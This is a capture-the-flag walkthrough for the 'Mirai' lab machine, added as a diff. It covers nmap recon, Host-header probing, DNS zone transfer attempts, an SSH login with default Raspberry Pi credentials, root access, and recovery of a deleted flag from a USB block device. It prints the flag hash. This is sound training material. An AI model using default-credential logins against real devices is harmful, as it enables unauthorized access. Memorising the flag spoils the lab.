@@ -1,0 +1,129 @@
+1. First step is to run an nmap scan of the remote machine, results are shown below:
+	# Nmap 7.80 scan initiated Sat Jan 25 01:59:16 2020 as: nmap -sC -sV -oA results 10.10.10.48
+	Nmap scan report for 10.10.10.48
+	Host is up (0.091s latency).
+	Not shown: 997 closed ports
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+	|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+	|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+	|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
+	53/tcp open  domain  dnsmasq 2.76
+	| dns-nsid: 
+	|_  bind.version: dnsmasq-2.76
+	80/tcp open  http    lighttpd 1.4.35
+	|_http-server-header: lighttpd/1.4.35
+	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Sat Jan 25 01:59:33 2020 -- 1 IP address (1 host up) scanned in 17.82 seconds
+
+We verify, if we can reach the http server. The result after using the web browser show nothing. Next 
+step is to use burp to analyze results via the repeater tab.
+
+2. While analyzing the results from burp we receive no data apart from header responses, one thing we can
+do with our request is modify the "host:" parameter and see if we get any results.
+
+For example if we change the "host" paramter from 10.10.10.48 to "pi" we receive a different page. We 
+come to find out that the website is being blocked however if we analyze the page source we find a url
+"http://pi.hole/admin/scripts/vendor/jquery.min.js"
+
+This may be a virtual host routing enabled on the server. So we modify out "/etc/hosts" file, to include
+"pi.hole" and "pi". We now get access to a web admin console, we try to login with default passwords
+"password", "admin", "adminpassword", but to no avail. We come to learn that the default password is 
+automatically generated so we are unable to to login through the web console. 
+
+3. We now look at dns and attempt to do a zone transfer since DNS is enabled through port 53.
+   We perform a basic dig command using the pi.hole as name server
+	dig @10.10.10.48 pi.hole
+   Not much info is revealed except an extraneous ip from a different subnet, so we now do our zone 
+   transfer.
+	dig axfr @10.10.10.48 pi.hole
+	dig axfr @10.10.10.48 pi
+  No responses are forwarded back.
+
+4. Since we have exhausted things to test we can attempt, to access the box through ssh with default,
+   credentials. Since the box is called mirai we can guess that the box has default credentials setup.
+   So while sshing we set our user to "pi" and password to "raspberry" as these are the default creds
+   for an inital rapsberry pi box.
+
+   Voila we get access to the box via ssh. We also check that that we have root privileges with "sudo -l"
+   amd indeed we have superuser privileges.
+	"sudo su -"
+
+5. However there is an issue with getting the root flag as it has been apprently removed but there is a 
+   backup in usb disk. 
+	root@raspberrypi:~# cat root.txt 
+	I lost my original root.txt! I think I may have a backup on my USB stick...
+
+   To check for this we can do the following:
+	df -lh 
+	Filesystem      Size  Used Avail Use% Mounted on
+	aufs            8.5G  2.8G  5.3G  34% /
+	tmpfs           100M  4.8M   96M   5% /run
+	/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
+	/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
+	tmpfs           250M     0  250M   0% /lib/live/mount/overlay
+	/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
+	devtmpfs         10M     0   10M   0% /dev
+	tmpfs           250M  8.0K  250M   1% /dev/shm
+	tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+	tmpfs           250M     0  250M   0% /sys/fs/cgroup
+	tmpfs           250M  8.0K  250M   1% /tmp
+	/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
+	tmpfs            50M     0   50M   0% /run/user/999
+	tmpfs            50M     0   50M   0% /run/user/1000
+
+
+   This will show us the block disk where the usb resides. After cding into the "/media/usbstick" directory
+   we find a text file asking if we can somehow recover the deleted root.txt file.
+
+6. The easiest way to capture the flag is by appying string to the block device.
+	strings /dev/sdb
+		>r &
+		/media/usbstick
+		lost+found
+		root.txt
+		damnit.txt
+		>r &
+		>r &
+		/media/usbstick
+		lost+found
+		root.txt
+		damnit.txt
+		>r &
+		/media/usbstick
+		2]8^
+		lost+found
+		root.txt
+		damnit.txt
+		>r &
+		3d3e483143ff12ec505d026fa13e020b
+		Damnit! Sorry man I accidentally deleted your files off the USB stick.
+		Do you know if there is any way to get them back?
+		-James
+
+  We have now the md5 hash from the root.txt, but is there another way of obtaining it. We can apply the 
+  following grep to retrieve it more cleanly.
+	grep -a '[a-z0-9]\{32\}' /dev/sdb
+		root@raspberrypi:/media/usbstick# grep -a '[a-z0-9]\{32\}' /dev/sdb
+		�|}*,.������+-���3d3e483143ff12ec505d026fa13e020b
+  We can also use xxd to analyze the contents of the usb. We can also use it in conjuction with grep to omit
+  undesired lines.
+	xxd /dev/sdb | grep -v '0000 0000 0000 0000 0000 0000 0000 0000'
+ 
+  There are also other forensic tools we can use to analyze the file, we can attempt to transfer the file
+  using some command line tools such as dcfldd, which is an enhanced version of dd for forensic analysis.
+
+	ssh pi@10.10.10.48 "sudo dcfldd if=/dev/sdb | gzip -1 -" | dcfldd of=pi.dd.gz
+	gunzip -d pi.dd.gz
+
+  We apply binwalk and recursively extract all the files that can be found.
+	binwalk -Me pi.dd
+  However no files that have the hash are recreated.
+
+  We can also use another tool called testdisk to attempt to retrieve the file. however that also fails.
+  Also another tool to use is photorec, however that also fails.
